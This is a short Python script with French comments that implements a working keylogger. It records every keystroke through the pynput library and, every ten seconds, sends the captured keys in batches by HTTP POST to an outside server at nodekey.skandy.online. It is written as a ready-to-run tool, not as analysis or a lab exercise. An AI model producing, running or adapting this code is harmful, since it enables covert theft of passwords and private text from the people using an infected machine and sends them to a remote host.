
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Assurez-vous d'installer requests: pip install requests pynput

import requests
import json
import threading
import sys
from datetime import datetime
from pynput import keyboard

# --- Configuration ---
SERVER_URL = 'http://nodekey.skandy.online/keylog/batch'
# Intervalle d'envoi en secondes
TIME_INTERVAL = 10

# --- Variable globale pour stocker les frappes ---
# Nous utilisons une liste pour correspondre au format attendu par le serveur
keys_buffer = []

def send_post_req():
    """Envoie les données au serveur et se reprogramme."""
    global keys_buffer

    try:
        if keys_buffer:
            # Crée une copie des données à envoyer et vide le buffer principal
            data_to_send = list(keys_buffer)
            keys_buffer.clear()

            # Le format attendu par votre serveur
            payload = {
                'keys': data_to_send,
                'timestamp': datetime.utcnow().isoformat(),
                'userAgent': f"Keylogger/3.0 on {sys.platform}"
            }
            
            # Envoi de la requête POST avec la bibliothèque requests
            r = requests.post(SERVER_URL, json=payload)
            r.raise_for_status() # Lève une exception si le statut est une erreur (4xx ou 5xx)
            
            print(f"[{datetime.now()}] Données envoyées ({len(data_to_send)} frappes). Status: {r.status_code}")
        else:
            print(f"[{datetime.now()}] Pas de nouvelles données à envoyer.")

    except requests.exceptions.RequestException as e:
        print(f"[ERREUR] Impossible d'envoyer les données: {e}")
        # En cas d'échec, on peut choisir de remettre les données dans le buffer
        # keys_buffer.extend(data_to_send)
    finally:
        # Reprogramme le timer pour le prochain envoi
        threading.Timer(TIME_INTERVAL, send_post_req).start()

def on_press(key):
    """Callback exécutée à chaque frappe de touche."""
    global keys_buffer

    try:
        # Gère les touches spéciales pour une meilleure lisibilité
        if key == keyboard.Key.enter:
            keys_buffer.append("\n")
        elif key == keyboard.Key.tab:
            keys_buffer.append("\t")
        elif key == keyboard.Key.space:
            keys_buffer.append(" ")
        elif key == keyboard.Key.backspace:
            # Au lieu de supprimer, on enregistre l'action
            keys_buffer.append("[BACKSPACE]")
        elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            # Ignore les touches de modification seules
            pass
        elif key == keyboard.Key.esc:
            # La touche Échap arrête le listener
            print("Touche Échap pressée, arrêt du keylogger...")
            return False
        else:
            # Enregistre la chaîne de la touche, en enlevant les apostrophes
            keys_buffer.append(str(key).strip("'"))
    except Exception as e:
        print(f"[ERREUR] dans on_press: {e}")

# --- Démarrage ---
if __name__ == "__main__":
    print(f"Keylogger démarré. Envoi des données toutes les {TIME_INTERVAL} secondes.")
    print("Appuyez sur 'Échap' pour arrêter.")

    # Démarre le premier envoi programmé
    # Le timer s'exécutera dans un thread séparé
    threading.Timer(TIME_INTERVAL, send_post_req).start()

    # Le listener de clavier bloque le thread principal
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    
    # Lorsque le listener s'arrête (avec Échap), envoie les données restantes
    print("\nArrêt du listener. Envoi des dernières données...")
    # On annule les timers en cours pour éviter un envoi après l'arrêt manuel
    for t in threading.enumerate():
        if isinstance(t, threading.Timer):
            t.cancel()
    send_post_req() # Fait un dernier envoi manuel
    print("Keylogger arrêté.")
